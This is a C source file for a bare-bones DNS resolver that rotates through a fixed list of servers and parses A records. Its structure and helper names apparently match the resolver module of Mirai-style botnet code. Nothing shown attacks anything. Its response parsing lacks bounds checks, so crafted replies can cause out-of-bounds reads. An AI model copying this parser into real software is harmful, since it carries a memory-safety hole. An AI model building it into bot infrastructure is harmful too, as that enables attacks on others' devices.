#include "includes.h"
#include "resolv.h"
#include "rand.h"
#include "protocol.h"
#include "util.h"

static const uint32_t dns_servers[] = {
    DNS_SERVER_1,
    DNS_SERVER_2,
    DNS_SERVER_3,
    DNS_SERVER_4,
    DNS_SERVER_5,
    DNS_SERVER_6,
    DNS_SERVER_7,
};
static const int dns_server_count = sizeof(dns_servers) / sizeof(dns_servers[0]);
static int dns_server_idx = 0;

static uint32_t get_next_dns(void) {
    dns_server_idx = (dns_server_idx + 1) % dns_server_count;
    return dns_servers[dns_server_idx];
}

void resolv_domain_to_hostname(char *dst, char *src) {
    char *pos = dst + 1;
    int label_len = 0;

    while (*src != 0) {
        if (*src == '.') {
            *(pos - label_len - 1) = label_len;
            pos++;
            label_len = 0;
        } else {
            *pos++ = *src;
            label_len++;
        }
        src++;
    }

    *(pos - label_len - 1) = label_len;
    *pos = 0;
}

struct resolv_entries *resolv_lookup(char *domain) {
    struct resolv_entries *entries = calloc(1, sizeof(struct resolv_entries));
    int fd, i, srv;
    uint16_t dns_id;
    char query[512], response[512];
    struct sockaddr_in addr;

    dns_id = rand_next() % 0xFFFF;

    struct dnshdr *dns = (struct dnshdr *)query;
    dns->id = htons(dns_id);
    dns->opts = htons(0x0100);
    dns->qdcount = htons(1);
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = 0;

    char *qname = (char *)(dns + 1);
    resolv_domain_to_hostname(qname, domain);

    struct dns_question *question = (struct dns_question *)(qname + util_strlen(domain) + 2);
    question->qtype = htons(1);
    question->qclass = htons(1);

    int query_len = sizeof(struct dnshdr) + util_strlen(domain) + 2 + sizeof(struct dns_question);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(entries);
        return NULL;
    }

    /* Try each DNS server in rotation */
    for (srv = 0; srv < dns_server_count; srv++) {
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = get_next_dns();
        addr.sin_port = htons(53);

        for (i = 0; i < 3; i++) {
            if (sendto(fd, query, query_len, 0, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
                continue;
            }

            fd_set fds;
            struct timeval tv;
            FD_ZERO(&fds);
            FD_SET(fd, &fds);
            tv.tv_sec = 1;
            tv.tv_usec = 500000;

            if (select(fd + 1, &fds, NULL, NULL, &tv) > 0) {
                int resp_len = recv(fd, response, sizeof(response), 0);
                if (resp_len >= sizeof(struct dnshdr)) {
                    struct dnshdr *resp = (struct dnshdr *)response;
                    if (resp->id == htons(dns_id) && resp->ancount > 0) {
                        char *pos = (char *)(resp + 1);
                        while (*pos != 0) pos += *pos + 1;
                        pos += 5;

                        int ancount = ntohs(resp->ancount);
                        for (int j = 0; j < ancount && entries->count < RESOLV_MAX_ENTRIES; j++) {
                            while ((*pos & 0xC0) == 0) pos += *pos + 1;
                            if ((*pos & 0xC0) == 0xC0) pos += 2;

                            pos += 8;
                            uint16_t rdlength = ntohs(*(uint16_t *)pos);
                            pos += 2;

                            if (rdlength == 4) {
                                entries->addrs[entries->count++] = *(uint32_t *)pos;
                            }
                            pos += rdlength;
                        }
                        if (entries->count > 0) {
                            close(fd);
                            return entries;
                        }
                    }
                }
            }
        }
    }

    close(fd);
    free(entries);
    return NULL;
}

void resolv_entries_free(struct resolv_entries *entries) {
    if (entries) free(entries);
}
